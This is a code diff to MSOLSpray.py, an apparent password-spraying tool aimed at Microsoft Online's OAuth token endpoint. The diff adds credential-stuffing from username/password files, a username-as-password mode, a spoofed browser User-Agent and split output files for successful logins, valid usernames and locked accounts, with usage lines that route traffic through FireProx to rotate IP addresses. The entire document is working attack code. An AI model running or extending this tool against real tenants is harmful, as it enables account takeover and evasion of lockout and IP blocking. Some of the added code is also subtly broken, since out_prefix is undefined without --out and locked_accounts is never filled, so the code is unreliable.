@@ -1,6 +1,7 @@
 import requests
 import argparse
 import time
+import re
 
 big_list_of_codes = {
     "AADSTS16000":	"InteractionRequired - User account '{EmailHidden}' from identity provider '{idp}' does not exist in tenant '{tenant}' and cannot access the application '{appid}'({appName}) in that tenant. This account needs to be added as an external user in the tenant first. Sign out and sign in again with a different Microsoft Entra user account. This error is fairly common when you try to log in to Microsoft Entra admin center by using personal Microsoft Account and no directory associated with it.",
@@ -319,14 +320,22 @@ This command will use the provided userlist and attempt to authenticate to each 
     python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020
 
 This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
-    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
+    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out PW_Spray1
+
+This command uses the specified FireProx URL, but with the username as the password.
+    python3 MSOLSpray.py --userlist ./userlist.txt --useraspass --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out PW_Spray1    
+
+This command uses the specified FireProx URL, but does Credential Stuffing using an input file with username\\tpassword per line (\\t describes Tab separated).
+    python3 MSOLSpray.py --credstuff ./credlist.txt --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out PW_Spray1 
 """
 
 parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
 
-parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
-parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
-parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
+parser.add_argument("--credstuff", metavar="FILE", help="File filled with username\\tpassword per line (\\t describes Tab separated). Username format 'user@domain.com'.")
+parser.add_argument("-u", "--userlist", metavar="FILE", help="File filled with usernames one-per-line in the format 'user@domain.com'.")
+parser.add_argument("-p", "--password", help="A single password that will be used to perform the password spray.")
+parser.add_argument("--useraspass", action="store_true", help="Pulling from the provided username list, using the username as the password")
+parser.add_argument("-o", "--out", metavar="OUTFILE", help="The prefix for the output files' naming convention. Three files will be produced (if applicable). For the example -o EXAMPLE --- EXAMPLE_successes.txt, EXAMPLE_valid_usernames.txt, EXAMPLE_locked_accounts.txt")
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
 parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
 parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
@@ -334,24 +343,55 @@ parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many 
 
 args = parser.parse_args()
 
-password = args.password
+credstuff_arg = False
+
+useraspass_arg = args.useraspass
+if useraspass_arg:
+    password = ''
+else:
+    password = args.password
 url = args.url
 force = args.force
-out = args.out
+
+if args.out != "":
+    index = args.out.find('.')
+    if index != -1:
+        out_prefix = args.out[:index]
+    else:
+        out_prefix = args.out
+
 verbose = args.verbose
 sleep = args.sleep
 
 usernames = []
-with open(args.userlist, "r") as userlist:
-    usernames = userlist.read().splitlines()
+password_list = []
+
+if args.credstuff:
+    credstuff_arg = True
+    with open(args.credstuff, "r") as credlist:
+        lines = credlist.read().splitlines()
+        for line in lines:
+            split_line = re.split(r'\t+', line)
+            usernames.append(split_line[0])
+            password_list.append(split_line[1])
+elif args.userlist:    
+    with open(args.userlist, "r") as userlist:
+        usernames = userlist.read().splitlines()
+else:
+    print(parser.print_help())
+    exit()
 
 username_count = len(usernames)
+password_count = len(password_list)
 
 print(f"There are {username_count} users in total to spray,")
 print("Now spraying Microsoft Online.")
 print(f"Current date and time: {time.ctime()}")
 
-results = ""
+success_results = ""
+valid_emails = ""
+locked_accounts = ""
+
 username_counter = 0
 lockout_counter = 0
 lockout_question = False
@@ -363,31 +403,58 @@ for username in usernames:
     username_counter += 1
     print(f"{username_counter} of {username_count} users tested", end="\r")
 
-    body = {
-        'resource': 'https://graph.windows.net',
-        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
-        'client_info': '1',
-        'grant_type': 'password',
-        'username': username,
-        'password': password,
-        'scope': 'openid',
-    }
+    if useraspass_arg:
+        useraspass = username.split("@")[0]
+        body = {
+            'resource': 'https://graph.windows.net',
+            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
+            'client_info': '1',
+            'grant_type': 'password',
+            'username': username,
+            'password': useraspass, # MODIFY HERE to include "2025", etc. at the end of each password
+            'scope': 'openid',
+        }
+        password = body['password']
+    elif credstuff_arg:
+         body = {
+            'resource': 'https://graph.windows.net',
+            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
+            'client_info': '1',
+            'grant_type': 'password',
+            'username': username,
+            'password': password_list[username_counter-1],
+            'scope': 'openid',
+         }
+         password = body['password']
+    else:
+        body = {
+            'resource': 'https://graph.windows.net',
+            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
+            'client_info': '1',
+            'grant_type': 'password',
+            'username': username,
+            'password': password,
+            'scope': 'openid',
+        }
 
     headers = {
         'Accept': 'application/json',
         'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
     }
 
     r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
 
     if r.status_code == 200:
         print(f"SUCCESS! {username} : {password}")
-        results += f"{username} : {password}\n"
+        success_results += f"{username} : {password}\n"
+        valid_emails += f"{username}\n"
     else:
         resp = r.json()
         error = resp["error_description"]
 
         if "AADSTS50126" in error:
+            valid_emails += f"{username}\n" 
             if verbose:
                 print(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
             continue
@@ -401,37 +468,43 @@ for username in usernames:
         elif "AADSTS50076" in error:
             # Microsoft MFA response
             print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
-            results += f"{username} : {password}\n"
+            success_results += f"{username} : {password}\n"
+            valid_emails += f"{username}\n"
         
         elif "AADSTS50079" in error:
             # Microsoft MFA response
             print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) must be onboarded!")
-            results += f"{username} : {password}\n"
+            success_results += f"{username} : {password}\n"
+            valid_emails += f"{username}\n"
 
         elif "AADSTS50158" in error:
             # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
             print(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-            results += f"{username} : {password}\n"
+            success_results += f"{username} : {password}\n"
+            valid_emails += f"{username}\n"
 
         elif "AADSTS53003" in error and not "AADSTS530034" in error:
             # Conditional Access response as per https://github.com/dafthack/MSOLSpray/issues/5
             print(f"SUCCESS! {username} : {password} - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance.")
-            results += f"{username} : {password}\n"
-
+            success_results += f"{username} : {password}\n"
+            valid_emails += f"{username}\n"
 
         elif "AADSTS50053" in error:
             # Locked out account or Smart Lockout in place
             print(f"WARNING! The account {username} appears to be locked.")
             lockout_counter += 1
+            valid_emails += f"{username}\n"
 
         elif "AADSTS50057" in error:
             # Disabled account
             print(f"WARNING! The account {username} appears to be disabled.")
+            valid_emails += f"{username}\n"
 
         elif "AADSTS50055" in error:
             # User password is expired
             print(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
-            results += f"{username} : {password}\n"
+            success_results += f"{username} : {password}\n"
+            valid_emails += f"{username}\n"
 
         else:
             # Unknown errors, lets check the big list:
@@ -440,6 +513,7 @@ for username in usernames:
                 if key in error:
                     in_list = True
                     print(f"WARNING! The account {username} : {password} gave an error we have not handled (yet) with the following message: {big_list_of_codes[key]}.")
+                    print(f"NOTE: The username ({username}) has not been added to the Valid Username list. Review the error and manually add the username if applicable.")
 
             if not in_list:
                 print(f"Got an error we haven't seen yet for user {username}")
@@ -464,7 +538,19 @@ for username in usernames:
 
         # else: continue even though lockout is detected
 
-if out and results != "":
-    with open(out, 'w') as out_file:
-        out_file.write(results)
-        print(f"Results have been written to {out}.")
+if out_prefix != "":
+    if success_results != "":
+        success_filename = f"{out_prefix}_successes.txt"
+        with open(success_filename, 'w') as success_file:
+            success_file.write(success_results)
+            print(f"Successful results have been written to {success_filename}.")
+    if valid_emails != "":
+        valid_filename = f"{out_prefix}_valid_usernames.txt"
+        with open(valid_filename, 'w') as valid_file:
+            valid_file.write(valid_emails)
+            print(f"Valid email addresses have been written to {valid_filename}.")
+    if locked_accounts != "":
+        locked_filename = f"{out_prefix}_locked_accounts.txt"
+        with open(locked_filename, 'w') as locked_file:
+            locked_file.write(locked_accounts)
+            print(f"A list of the locked accounts has been written to {locked_filename}.")
